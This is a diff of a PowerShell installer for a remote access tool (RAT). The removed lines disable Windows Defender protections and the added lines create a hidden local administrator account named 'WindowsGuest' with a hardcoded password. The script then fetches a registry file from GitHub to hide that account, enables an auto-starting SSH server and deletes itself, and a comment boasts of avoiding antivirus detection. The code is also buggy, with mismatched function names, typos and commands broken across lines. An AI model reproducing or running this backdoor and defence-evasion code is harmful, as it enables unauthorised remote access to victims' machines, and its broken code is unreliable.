@@ -1,51 +1,61 @@
 # builds resources for remote access tool
 
 # random string for directories
-
 function random_text{
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 }
 
-
-try {
-  Get-Service WinDefend | Stop-Service -Force
-  Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\services\WinDefend" -Name "Start" -Value 4 -Type DWORD -Force
-} catch {
-  Write-Warning "Failed to disable WinDefend service"
+# create local admin
+function create_account {
+    [CmdletBinding()]
+    param (
+        [string] $NewLocalAdmin,
+        [securestring] $Password
+    )    
+    begin {
+    }    
+    process {
+        New-LocalUser "$NewLocalAdmin" -Password $Passwrod -FullName "$NewLocalAdmin" -Description "Temporary local admin"
+        Write-Verbose "$NewLocalAdmin local user crated"
+        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
+        Write-Verbose "$NewLocalAdmin added to the local administrator group"
+    }    
+    end {
+    }
 }
 
-try {
-  New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft' -Name "Windows Defender" -Force -ea 0 | Out-Null
-  New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
-  New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
-  New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0 -PropertyType DWORD -Force -ea 0 | Out-Null
-  New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 0 -PropertyType DWORD -Force -ea 0 | Out-Null
-  New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MRT" -Name "DontReportInfectionInformation" -Value 1 -PropertyType DWORD -Force -ea 0 | Out-Null
-  if (-Not ((Get-WmiObject -class Win32_OperatingSystem).Version -eq "6.1.7601")) {
-    Add-MpPreference -ExclusionPath "C:\" -Force -ea 0 | Out-Null
-    Set-MpPreference -DisableArchiveScanning $true  -ea 0 | Out-Null
-    Set-MpPreference -DisableBehaviorMonitoring $true -Force -ea 0 | Out-Null
-    Set-MpPreference -DisableBlockAtFirstSeen $true -Force -ea 0 | Out-Null
-    Set-MpPreference -DisableCatchupFullScan $true -Force -ea 0 | Out-Null
-    Set-MpPreference -DisableCatchupQuickScan $true -Force -ea 0 | Out-Null
-    Set-MpPreference -DisableIntrusionPreventionSystem $true  -Force -ea 0 | Out-Null
-    Set-MpPreference -DisableIOAVProtection $true -Force -ea 0 | Out-Null
-    Set-MpPreference -DisableRealtimeMonitoring $true -Force -ea 0 | Out-Null
-    Set-MpPreference -DisableRemovableDriveScanning $true -Force -ea 0 | Out-Null
-    Set-MpPreference -DisableRestorePoint $true -Force -ea 0 | Out-Null
-    Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true -Force -ea 0 | Out-Null
-    Set-MpPreference -DisableScanningNetworkFiles $true -Force -ea 0 | Out-Null
-    Set-MpPreference -DisableScriptScanning $true -Force -ea 0 | Out-Null
-    Set-MpPreference -EnableControlledFolderAccess Disabled -Force -ea 0 | Out-Null
-    Set-MpPreference -EnableNetworkProtection AuditMode -Force -ea 0 | Out-Null
-    Set-MpPreference -MAPSReporting Disabled -Force -ea 0 | Out-Null
-    Set-MpPreference -SubmitSamplesConsent NeverSend -Force -ea 0 | Out-Null
-    Set-MpPreference -PUAProtection Disabled -Force -ea 0 | Out-Null
-  }
-} catch {
-  Write-Warning "Failed to disable Windows Defender"
-}
+## variables
+$wd = random_text
+$path = "$env:temp/$wd"
+$initial_dir = Get-Location
 
-cd $env:TEMP
-$directory_name = random_text
-mkdir $directory_name
+# go to temp. make a working directory
+mkdir $path
+cd $path
+
+# create admin user
+Remove-LocalUser -Name "WindowsGuest"
+$NewLocalAdmin = "WindowsGuest"
+$String = RpLGWiUsIy
+$Password = (ConvertTo-SecureString $String -AsPlainText -Force)
+Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
+
+# create registery to hide local admin
+$reg_file = random_text
+Invoke-WebRequest -Uri https://github.com/tarasermolenko/RemoteAccessTool/blob/main/files/admin.reg -OutFile 
+"$reg_file.reg"
+
+# visual basic script to register the registery
+./"$reg_file.reg";"vbs_file.vbs"
+
+# dont disable wdef until need to, not av detectable up until here
+
+Add-WindowsCapability -Online 
+-Name OpenSSG.Server~~~~0.0.1.0
+Start-Service sshd
+Set-Service -Name sshd
+-StartupTpe 'Automatic'
+Get-NetFireWallRule -Name *ssh*
+
+cd $initial_dir
+del rat_installer.ps1
